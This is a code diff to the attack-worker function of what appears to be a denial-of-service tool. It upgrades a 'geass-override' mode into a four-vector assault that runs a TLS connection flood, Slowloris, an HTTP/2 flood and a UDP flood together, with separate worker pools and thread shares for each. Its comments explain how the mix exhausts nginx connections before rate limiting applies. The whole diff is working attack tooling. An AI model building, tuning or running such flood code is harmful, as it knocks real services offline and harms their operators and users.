@@ -155,20 +155,26 @@ async function runAttackWorkers(
     return;
   }
 
-  // Geass Override: triple vector with SEPARATE worker pools per attack type
-  // HTTP/TCP use multi-worker pools; UDP stays as single worker (see above)
+  // Geass Override: QUAD vector — Connection Flood + Slowloris + HTTP/2 + UDP
+  // Connection Flood exhausts nginx worker_connections BEFORE HTTP rate limiting
+  // Slowloris holds half-open TLS connections for the remainder
+  // HTTP/2 multiplexed streams fill any remaining capacity
+  // UDP saturates bandwidth simultaneously
   if (method === "geass-override") {
-    const httpW = Math.ceil(CPU_COUNT * 0.50);  // 4 workers → HTTP pipeline
-    const tcpW  = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → TCP flood
+    const connW = Math.ceil(CPU_COUNT * 0.35);  // 3 workers → TLS connection flood
+    const slowW = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → Slowloris
+    const h2W   = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → HTTP/2
 
-    const httpT = Math.max(1, Math.round(threads * 0.50));
-    const tcpT  = Math.max(1, Math.round(threads * 0.25));
-    const udpT  = Math.max(1, threads - httpT - tcpT);
+    const connT = Math.max(1, Math.round(threads * 0.40));  // 40% → connection flood
+    const slowT = Math.max(1, Math.round(threads * 0.30));  // 30% → slowloris
+    const h2T   = Math.max(1, Math.round(threads * 0.20));  // 20% → http/2
+    const udpT  = Math.max(1, threads - connT - slowT - h2T); // remainder → UDP
 
     await Promise.all([
-      spawnPool("http-flood", target, port, httpT, httpW, signal, onStats),
-      spawnPool("tcp-flood",  target, port, tcpT,  tcpW,  signal, onStats),
-      spawnPool("udp-flood",  target, port, udpT,  1,     signal, onStats), // 1 UDP worker
+      spawnPool("conn-flood",  target, port, connT, connW, signal, onStats),
+      spawnPool("slowloris",   target, port, slowT, slowW, signal, onStats),
+      spawnPool("http2-flood", target, port, h2T,   h2W,   signal, onStats),
+      spawnPool("udp-flood",   target, port, udpT,  1,     signal, onStats), // 1 UDP worker
     ]);
     return;
   }
